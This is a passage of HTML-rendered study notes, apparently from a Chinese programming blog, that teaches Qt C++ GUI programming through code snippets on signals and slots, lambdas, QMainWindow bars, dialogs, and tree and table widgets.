class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//button.h</span></span><br><span class=\"line\">signals:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rang</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//recv.h</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recvsignals</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//recv.cpp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recv::recvsignals</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"接受成功\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后就是连接,这里我们<strong>需要注意只有rang之后才会接受</strong></p>\n<p>所以就需要rang起来，<strong>这里用的plz函数让它rang</strong></p>\n<p>其中的一些成员名需要在<code>widget.h</code>中是实现</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//widget.h</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    Widget(QWidget *parent = <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">plz</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    ~Widget();</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    MyPushButton * btn;</span><br><span class=\"line\">    recv * recv1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//widget.cpp</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;btn = <span class=\"keyword\">new</span> MyPushButton(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;recv1 = <span class=\"keyword\">new</span> recv;</span><br><span class=\"line\">        btn-&gt;show();</span><br><span class=\"line\">        btn-&gt;setParent(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        btn-&gt;setText(<span class=\"string\">\"我的按钮\"</span>);</span><br><span class=\"line\">        btn-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"built_in\">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class=\"line\">        plz();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Widget::plz</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    emit btn-&gt;rang();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-重载信号和槽\"><a href=\"#2-重载信号和槽\" class=\"headerlink\" title=\"2.重载信号和槽\"></a>2.重载信号和槽</h3><p>接着上个案例</p>\n<p><strong>重载信号 重载槽 重新定义槽函数</strong> </p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//button.h</span></span><br><span class=\"line\">signals:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rang</span><span class=\"params\">(QString)</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//recv.h</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recvsignals</span><span class=\"params\">(QString s)</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//recv.p</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recv::recvsignals</span><span class=\"params\">(QString second)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"接受成功响铃\"</span> &lt;&lt; second &lt;&lt; <span class=\"string\">\"秒\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于连接无法分清函数地址，这里用<strong>函数指针来体现函数地址</strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//简单说一下函数指针</span></span><br><span class=\"line\"><span class=\"comment\">//返回类型为空 第一个括号里为指针 第二个括号为参数 =后面是需要指向函数的地址</span></span><br><span class=\"line\"><span class=\"keyword\">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class=\"line\"><span class=\"keyword\">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class=\"line\"><span class=\"built_in\">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class=\"line\">plz();</span><br></pre></td></tr></table></figure>\n<p>成功实现</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png\" alt=\"image-20201207233628350\"></p>\n<blockquote>\n<p>Qstring怎么去掉引号</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h3 id=\"3-信号和槽的拓展\"><a href=\"#3-信号和槽的拓展\" class=\"headerlink\" title=\"3.信号和槽的拓展\"></a>3.信号和槽的拓展</h3><ul>\n<li>信号可以连接信号</li>\n<li>一个信号可以连接多个槽函数</li>\n<li>多个信号可以连接同一个槽函数</li>\n<li><strong>信号和槽函数的类型必须一一对应</strong></li>\n<li>信号的参数个数可以大于槽函数的参数个数</li>\n</ul>\n<h4 id=\"信号连接信号\"><a href=\"#信号连接信号\" class=\"headerlink\" title=\"信号连接信号\"></a>信号连接信号</h4><p>继续下一个</p>\n<p><strong>我们按下按钮1才会响铃</strong></p>\n<p>这里用两种实现</p>\n<ol>\n<li>点击连接plz函数</li>\n<li><strong>点击连接响铃信号</strong>,此时函数中无参数</li>\n</ol>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//widget.cpp</span></span><br><span class=\"line\">        QPushButton *btn1 = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"响铃\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        btn1-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"built_in\">connect</span>(btn1,&amp;QPushButton::clicked,<span class=\"keyword\">this</span>,&amp;Widget::plz);</span><br><span class=\"line\"><span class=\"comment\">//widget.cpp</span></span><br><span class=\"line\">\t\t    QPushButton *btn1 = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"响铃\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        btn1-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"built_in\">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure>\n<p>效果图如下</p>\n<p>方法1</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png\" alt=\"image-20201208162609069\"></p>\n<p>方法2</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png\" alt=\"image-20201208163512899\"></p>\n<h3 id=\"4-Lambda表达式\"><a href=\"#4-Lambda表达式\" class=\"headerlink\" title=\"4.Lambda表达式\"></a>4.Lambda表达式</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[=]()&#123;</span><br><span class=\"line\">\t\t\tbtn1-&gt;setText(<span class=\"string\">\"第二个\"</span>);</span><br><span class=\"line\">&#125;();  <span class=\"comment\">//()调用</span></span><br><span class=\"line\"><span class=\"comment\">//[]必须存在 不可省略</span></span><br><span class=\"line\"><span class=\"comment\">//()重载函数的参数</span></span><br><span class=\"line\"><span class=\"comment\">//= 值传递</span></span><br><span class=\"line\"><span class=\"comment\">//&amp; 引用传递</span></span><br><span class=\"line\"><span class=\"comment\">//a 只对a传递</span></span><br><span class=\"line\"><span class=\"comment\">//&amp;a 只对引用a传递</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//对于想要值修改，需要mutable关键字,但不改变本体</span></span><br><span class=\"line\">[=]()<span class=\"keyword\">mutable</span>&#123;m = <span class=\"number\">100</span> + <span class=\"number\">10</span>;</span><br><span class=\"line\">            qDebug &lt;&lt; m;&#125;();</span><br><span class=\"line\"><span class=\"comment\">//返回值 -&gt;返回值类型</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> ret = []()-&gt;<span class=\"keyword\">int</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">1000</span>;&#125;();</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x04-QMainWindow\"><a href=\"#0x04-QMainWindow\" class=\"headerlink\" title=\"0x04 QMainWindow\"></a>0x04 QMainWindow</h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png\" alt=\"image-20201208225426943\"></p>\n<h3 id=\"1-菜单栏\"><a href=\"#1-菜单栏\" class=\"headerlink\" title=\"1.菜单栏\"></a>1.菜单栏</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//菜单栏</span></span><br><span class=\"line\"><span class=\"comment\">//菜单栏最多有一个</span></span><br><span class=\"line\"><span class=\"comment\">//创建菜单栏</span></span><br><span class=\"line\">QMenuBar * bar = menuBar();</span><br><span class=\"line\"><span class=\"comment\">//将菜单栏放入到窗口中</span></span><br><span class=\"line\">setMenuBar(bar);</span><br><span class=\"line\"><span class=\"comment\">//创建菜单</span></span><br><span class=\"line\">QMenu * fileMenu = bar-&gt;addMenu(<span class=\"string\">\"文件\"</span>);</span><br><span class=\"line\">QMenu * editMenu = bar-&gt;addMenu(<span class=\"string\">\"编辑\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//创建菜单项</span></span><br><span class=\"line\"><span class=\"comment\">//fileMenu-&gt;addAction(\"新建\");</span></span><br><span class=\"line\">QAction * action1 = fileMenu-&gt;addAction(<span class=\"string\">\"新建\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//添加分隔符</span></span><br><span class=\"line\">fileMenu-&gt;addSeparator();</span><br><span class=\"line\">QAction * action2 = fileMenu-&gt;addAction(<span class=\"string\">\"打开\"</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-工具栏\"><a href=\"#2-工具栏\" class=\"headerlink\" title=\"2.工具栏\"></a>2.工具栏</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//工具栏</span></span><br><span class=\"line\"><span class=\"comment\">//工具栏 可以有多个</span></span><br><span class=\"line\">QToolBar * toolBar = <span class=\"keyword\">new</span> QToolBar(<span class=\"keyword\">this</span>);</span><br><span class=\"line\"><span class=\"comment\">//工具栏区域</span></span><br><span class=\"line\">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class=\"line\"><span class=\"comment\">//设置工具栏区域 只允许左右停靠</span></span><br><span class=\"line\">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class=\"line\"><span class=\"comment\">//设置浮动</span></span><br><span class=\"line\">toolBar-&gt;setFloatable(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">//设置移动</span></span><br><span class=\"line\">toolBar-&gt;setMovable(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">//设置内容</span></span><br><span class=\"line\"><span class=\"comment\">//toolBar-&gt;addAction(\"新建\");</span></span><br><span class=\"line\">toolBar-&gt;addAction(action1);</span><br><span class=\"line\"><span class=\"comment\">//添加分割线</span></span><br><span class=\"line\">toolBar-&gt;addSeparator();</span><br><span class=\"line\">toolBar-&gt;addAction(action2);</span><br><span class=\"line\"><span class=\"comment\">//工具栏添加控件</span></span><br><span class=\"line\">QPushButton *btn = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"点这里\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-状态栏\"><a href=\"#3-状态栏\" class=\"headerlink\" title=\"3.状态栏\"></a>3.状态栏</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//状态栏</span></span><br><span class=\"line\"><span class=\"comment\">//状态栏可以有多个</span></span><br><span class=\"line\">QStatusBar * stBar = statusBar();</span><br><span class=\"line\"><span class=\"comment\">//设置到窗口</span></span><br><span class=\"line\">setStatusBar(stBar);</span><br><span class=\"line\"><span class=\"comment\">//添加标签控件</span></span><br><span class=\"line\"><span class=\"comment\">//左侧提示</span></span><br><span class=\"line\">QLabel * label = <span class=\"keyword\">new</span> QLabel(<span class=\"string\">\"左侧信息\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">stBar-&gt;addWidget(label);</span><br><span class=\"line\"><span class=\"comment\">//右侧提示</span></span><br><span class=\"line\">QLabel * label1 = <span class=\"keyword\">new</span> QLabel(<span class=\"string\">\"右侧信息\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-浮动窗口\"><a href=\"#4-浮动窗口\" class=\"headerlink\" title=\"4.浮动窗口\"></a>4.浮动窗口</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//铆接部件(浮动窗口)</span></span><br><span class=\"line\"><span class=\"comment\">//铆接部件 可以有多个</span></span><br><span class=\"line\">QDockWidget * dock = <span class=\"keyword\">new</span> QDockWidget(<span class=\"string\">\"浮动\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class=\"line\"><span class=\"comment\">//设置停靠区域</span></span><br><span class=\"line\">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-核心部件\"><a href=\"#5-核心部件\" class=\"headerlink\" title=\"5.核心部件\"></a>5.核心部件</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//设置中心部件(只能有一个)</span></span><br><span class=\"line\">QTextEdit * edit = <span class=\"keyword\">new</span> QTextEdit(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">setCentralWidget(edit);</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x05-资源文件\"><a href=\"#0x05-资源文件\" class=\"headerlink\" title=\"0x05 资源文件\"></a>0x05 资源文件</h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png\" alt=\"image-20201209001543539\"></p>\n<h2 id=\"0x06-对话框\"><a href=\"#0x06-对话框\" class=\"headerlink\" title=\"0x06 对话框\"></a>0x06 对话框</h2><h3 id=\"1-基本概念\"><a href=\"#1-基本概念\" class=\"headerlink\" title=\"1.基本概念\"></a>1.基本概念</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//新建按钮 弹出对话框</span></span><br><span class=\"line\">    <span class=\"built_in\">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class=\"line\">        <span class=\"comment\">//模态对话框 （不可以对其它窗口进行操作）</span></span><br><span class=\"line\">        <span class=\"comment\">//非模态对话框 （可以对其他窗口进行操作）</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//模态对话框的创建</span></span><br><span class=\"line\">        QDialog dlg(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        <span class=\"comment\">//对话框的大小</span></span><br><span class=\"line\">        dlg.resize(<span class=\"number\">200</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">        <span class=\"comment\">//对话框阻塞</span></span><br><span class=\"line\">        dlg.exec();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//非模态对话框</span></span><br><span class=\"line\">        QDialog *dlg2 = <span class=\"keyword\">new</span> QDialog(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        dlg2-&gt;resize(<span class=\"number\">200</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">        dlg2-&gt;show();</span><br><span class=\"line\">        <span class=\"comment\">//关闭释放内存</span></span><br><span class=\"line\">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-标准对话框\"><a href=\"#2-标准对话框\" class=\"headerlink\" title=\"2.标准对话框\"></a>2.标准对话框</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//消息对话框</span></span><br><span class=\"line\"><span class=\"comment\">//错误对话框</span></span><br><span class=\"line\"><span class=\"comment\">//QMessageBox::critical(this,\"错误\",\"错误\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//信息对话框</span></span><br><span class=\"line\"><span class=\"comment\">//QMessageBox::information(this,\"消息\",\"消息\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//提问对话框</span></span><br><span class=\"line\"><span class=\"comment\">//参数1 父亲 参数2 标题 参数3 提示内容 参数4 按键类型</span></span><br><span class=\"line\">QMessageBox::question(<span class=\"keyword\">this</span>,<span class=\"string\">\"提问\"</span>,<span class=\"string\">\"提问\"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(QMessageBox::Save==QMessageBox::question(<span class=\"keyword\">this</span>,<span class=\"string\">\"提问\"</span>,<span class=\"string\">\"提问\"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"保存\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-其他对话框\"><a href=\"#3-其他对话框\" class=\"headerlink\" title=\"3.其他对话框\"></a>3.其他对话框</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//颜色对话框</span></span><br><span class=\"line\"><span class=\"comment\">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class=\"line\"><span class=\"comment\">//文件对话框</span></span><br><span class=\"line\"><span class=\"comment\">//参数1 父亲 参数2 标题 参数3 目录 参数4 文件格式</span></span><br><span class=\"line\"><span class=\"comment\">//QString str = QFileDialog::getOpenFileName(this,\"打开\",\"c://\",\"(*.txt)\");</span></span><br><span class=\"line\"><span class=\"comment\">//字体对话框</span></span><br><span class=\"line\"><span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\">QFontDialog::getFont(&amp;flag,QFont(<span class=\"string\">\"华文彩云\"</span>,<span class=\"number\">36</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x07-界面布局\"><a href=\"#0x07-界面布局\" class=\"headerlink\" title=\"0x07 界面布局\"></a>0x07 界面布局</h2><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png\" alt=\"image-20201210092318304\"></p>\n<h2 id=\"0x08-控件\"><a href=\"#0x08-控件\" class=\"headerlink\" title=\"0x08 控件\"></a>0x08 控件</h2><h3 id=\"1-按钮\"><a href=\"#1-按钮\" class=\"headerlink\" title=\"1.按钮\"></a>1.按钮</h3><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png\" alt=\"image-20201210100503686\"></p>\n<h3 id=\"2-树控件\"><a href=\"#2-树控件\" class=\"headerlink\" title=\"2.树控件\"></a>2.树控件</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//树控件的使用</span></span><br><span class=\"line\"><span class=\"comment\">//水平头</span></span><br><span class=\"line\">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class=\"string\">\"英雄\"</span> &lt;&lt; <span class=\"string\">\"英雄介绍\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//加载顶层的节点</span></span><br><span class=\"line\">QTreeWidgetItem * liitem =  <span class=\"keyword\">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class=\"string\">\"力量\"</span>);</span><br><span class=\"line\">QTreeWidgetItem * spitem =  <span class=\"keyword\">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class=\"string\">\"速度\"</span>);</span><br><span class=\"line\">QTreeWidgetItem * faitem =  <span class=\"keyword\">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class=\"string\">\"法力\"</span>);</span><br><span class=\"line\">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class=\"line\">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class=\"line\">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-table控件\"><a href=\"#3-table控件\" class=\"headerlink\" title=\"3.table控件\"></a>3.table控件</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//table控件</span></span><br><span class=\"line\">    <span class=\"comment\">//设置列数</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setColumnCount(<span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"comment\">//设置水平表头</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class=\"string\">\"姓名\"</span> &lt;&lt;<span class=\"string\">\"性别\"</span> &lt;&lt; <span class=\"string\">\"年龄\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//设置行数</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setRowCount(<span class=\"number\">5</span>);</span><br><span class=\"line\">    <span class=\"comment\">//设置正文</span></span><br><span class=\"line\">    ui-&gt;tableWidget-&gt;setItem(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"keyword\">new</span> QTableWidgetItem(<span class=\"string\">\"压缩\"</span>));</span><br><span class=\"line\">    <span class=\"comment\">//列表</span></span><br><span class=\"line\">    QList&lt;QString&gt; namelist;</span><br><span class=\"line\">    QStringList sexlist;</span><br><span class=\"line\">    sexlist &lt;&lt; <span class=\"string\">\"男\"</span> &lt;&lt; <span class=\"string\">\"男\"</span> &lt;&lt; <span 